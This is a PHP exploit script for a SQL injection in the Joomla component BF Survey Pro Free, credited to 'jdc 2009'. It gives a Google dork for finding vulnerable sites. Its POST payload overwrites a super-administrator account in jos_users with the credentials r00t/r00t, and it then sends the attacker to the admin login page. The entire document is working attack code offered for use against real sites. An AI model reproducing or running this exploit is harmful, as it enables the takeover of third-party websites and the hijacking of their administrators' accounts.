Joomla Component BF Survey Pro Free SQL Injection Exploit
=========================================================


<?php
 echo &#039;<h2>Joomla Component BF Survey Pro Free SQL Injection Exploit</h2>&#039;;
 echo &#039;<h4>jdc 2009</h4>&#039;;
 echo &#039;<p>Google dork: inurl:com_bfsurvey_profree</p>&#039;;
   ini_set( "memory_limit", "128M" );
   ini_set( "max_execution_time", 0 );
   set_time_limit( 0 );
   if( !isset( $_GET[&#039;url&#039;] ) ) die( &#039;Usage: &#039;.$_SERVER[&#039;SCRIPT_NAME&#039;].&#039;?url=www.victim.com&#039; );
   $vulnerableFile = "http://".$_GET[&#039;url&#039;]."/index.php";
   $url = $vulnerableFile;
 $data = array();
 $data[&#039;option&#039;] = &#039;com_bfsurvey_profree&#039;;
 $data[&#039;task&#039;] = &#039;updateOnePage&#039;;
 $data[&#039;table&#039;] = "jos_users set username=CHAR(".sqlChar( &#039;r00t&#039; )."), password=CHAR(".sqlChar( md5(&#039;r00t&#039; ) )."), email=CHAR(".sqlChar( &#039;x&#039; ).") where gid=25 limit 1   --   &#039;";
 $output = getData();
 die( &#039;<script>alert("Now log in as r00t/r00t!");location.href="http://&#039;.$_GET[&#039;url&#039;].&#039;/administrator/index.php";</script>&#039; );
 function shutUp( $buffer ) { return false; }
 function sqlChar( $str ) { return implode( &#039;,&#039;, array_map( &#039;ord&#039;, str_split( $str ) ) ); }
 function getData()
 {
   global $data, $url;
   ob_start( "shutUp" );
   $ch = curl_init();
   curl_setopt( $ch, CURL_TIMEOUT, 120 );
   curl_setopt( $ch, CURL_RETURNTRANSFER, 0 );
   curl_setopt( $ch, CURLOPT_URL, $url );
   if( count( $data ) > 0 )
   {
           curl_setopt( $ch, CURLOPT_POST, count( $data ) );
           curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $data ) );
   }
   curl_setopt( $ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)" );
   curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
   $result = curl_exec( $ch );
   curl_close( $ch );
   $return = ob_get_contents();
   ob_end_clean();
   return $return;
 }
?>



